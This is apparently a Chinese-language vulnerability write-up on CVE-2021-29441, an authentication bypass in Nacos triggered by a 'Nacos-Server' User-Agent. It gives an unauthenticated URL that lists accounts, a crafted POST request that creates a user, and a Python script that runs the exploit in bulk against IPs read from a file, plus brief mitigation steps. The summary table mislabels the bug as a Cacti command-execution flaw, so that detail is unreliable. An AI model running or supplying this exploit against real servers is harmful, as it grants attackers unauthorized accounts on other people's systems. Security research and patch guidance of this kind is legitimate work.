# 0X00 漏洞信息
Nacos是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理.Nacos是阿里开放的一款中间件，它主要提供三种功能：持久化节点注册，非持久化节点注册和配置管理。

当 Nacos在执行身份验证和授权操作时确定请求的用户代理是否为“Nacos-Server”时，由于简单的配置，通过利用此未经授权的漏洞，攻击者直接执行nacos的相关api接口进行漏洞利用。




# 0X01 漏洞概述
| 漏洞名称  | Cacti任意命令执行漏洞                           |
| --------- | ----------------------------------------------- |
| 漏洞等级  | 高危                                            |
| CVE编号   | CVE-2021-29441                                  |
| CNVD编号  | 暂无                                            |
| CNNVD编号 | 暂无                                            |
| 其他编号  | 暂无                                            |
| 披露时间  | 2021-04-27                                      |
| 分数      | 9.8                                             |
| CVSS      | 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H         |
| 披露链接  | https://nvd.nist.gov/vuln/detail/CVE-2021-29441 |



# 0X02 影响范围

nacos <=2.0.0-ALPHA.1



# 0X03 环境搭建

无




# 0X04 代码审计
无



# 0X05 漏洞复现

1、访问下面连接

```
#pageNo表示第几页，pageSize表示一页显示几个账号，可以根据需要修改，8848是Nacos默认端口
http://YOUIP:8848/nacos/v1/auth/users?pageNo=1&pageSize=2
```

默认配置下就可以直接显示服务下的账号信息

![image-20240617170012660](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202406171700116.png)

这里可以正常显示的话就表示漏洞可以正常利用



2、构造数据包

```
POST /nacos/v1/auth/users?username=lym&password=Talent@123 HTTP/1.1
Host: YOUIP:8848
User-Agent: Nacos-Server
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 19
```



- 其中username和password即为新增的账号密码
- user-Agent需要设置为Nacos-Server
- 如果返回"create user ok!" 即利用成功



![img](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202406171702655.png)




# 0X06 解决方案
1、升级到最新版本的nacos

2、修改配置文件application.properties

```
nacos.core.auth.enabled=true
nacos.core.auth.system.type=nacos
```

3、代码升级，分别在 `spring.cloud.nacos.discovery`和`spring.cloud.nacos.config`中添加你安装nacos的账号和密码

![img](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202406171706852.png)



修改`nacos.core.auth.server.identity.key`和`nacos.core.auth.server.identity.value`值为自定义值

![img](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202406171706092.png)



# 0X07 POC

nacos.py

```python
# coding=utf-8


import time
import requests
import urllib3


urllib3.disable_warnings()
headers = {
#    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
    'User-Agent': "Nacos-Server",
    "Accept-Encoding": "gzip, deflate",
}

def nacos(ip):
    try:
        check_url = '/nacos/v1/auth/users'
        exp_data = {
            "username": "ahai1234",
            "password": "ahai1234",
        }
        check_url2 = ip + '/nacos/v1/auth/users?pageNo=1&pageSize=100'
        poc_url = ip + check_url
        response = requests.post(url=poc_url, headers=headers, timeout=10, verify=False, data=exp_data)
        res_data = response.text
        #print(res_data)
        if "already exist!" in res_data:
            print('用户名ahai123已经存在', check_url2)
        elif "create user ok!" in res_data:
            res = requests.get(url=check_url2, headers=headers, timeout=10, verify=False)
            if "ahai123" in res.text:
               print(ip)
               print("添加用户名成功")
        else:
             print(ip)
             print("漏洞利用失败")
    except:
        print(ip) 
        print("连接超时！")


def get_url():
    with open('ip.txt', 'r') as f:	#ip.txt为nacos的ip地址
        ips = f.readlines()
        for ip in ips:
            ip = ip.strip()
            #print(ip)
            if ip[0:5] == 'https':
                ip = ip
            elif ip[0:4] == 'http':
                ip = ip
            else:
                ip = 'http://' + ip
            nacos(ip)


if __name__ == "__main__":
    get_url()


```

![image-20240617171351125](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202406171713168.png)